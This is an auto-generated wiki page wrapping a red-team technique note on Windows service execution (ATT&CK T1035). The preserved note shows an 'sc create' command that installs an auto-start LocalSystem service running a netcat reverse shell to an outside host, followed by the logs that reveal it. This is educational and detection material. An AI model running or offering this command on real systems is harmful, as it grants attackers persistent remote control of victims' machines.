---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Service Execution

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1035-service-execution` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1035-service-execution.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Service Execution](../../topics/offensive-security/service-execution.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-t1035-service-execution |
| name | Service Execution |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/t1035-service-execution.md |

## Preserved Source Material

````yaml
_asset_filenames:
- services-logs.png
- services-nc.png
- services-shell.png
_body: '---

  description: ''Code Execution, Privilege Escalation''

  ---


  # Service Execution


  ## Execution


  Creating an evil service with a netcat reverse shell:


  {% code title="attacker@victim" %}

  ```csharp

  C:\> sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""

  [SC] CreateService SUCCESS

  C:\> sc start evilsvc

  ```

  {% endcode %}


  ## Observations


  The reverse shell lives under services.exe as expected:


  ![](../../.gitbook/assets/services-nc.png)


  Windows security, application, Service Control Manager and sysmon logs provide some juicy details:


  ![](../../.gitbook/assets/services-logs.png)


  ![](../../.gitbook/assets/services-shell.png)


  ## References


  {% embed url="https://attack.mitre.org/wiki/Technique/T1035" %}'
_relative_path: offensive-security/persistence/t1035-service-execution.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1035-service-execution.md
````
